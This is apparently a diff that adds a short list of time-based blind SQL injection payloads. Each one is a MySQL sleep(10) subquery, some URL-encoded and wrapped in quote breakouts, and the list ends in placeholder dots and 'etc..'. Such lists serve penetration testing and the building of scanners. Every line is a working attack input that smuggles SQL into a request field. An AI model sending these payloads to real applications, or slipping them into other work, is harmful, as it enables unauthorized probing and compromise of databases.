@@ -1,0 +1,9 @@
+'%2b(select*from(select(sleep(10)))a)%2b'
+(select*from(select(sleep(10)))a)
+1'%2b(select*from(select(sleep(10)))a)%2b'
+,(select * from (select(sleep(10)))a)
+.
+.
+.
+.
+etc..
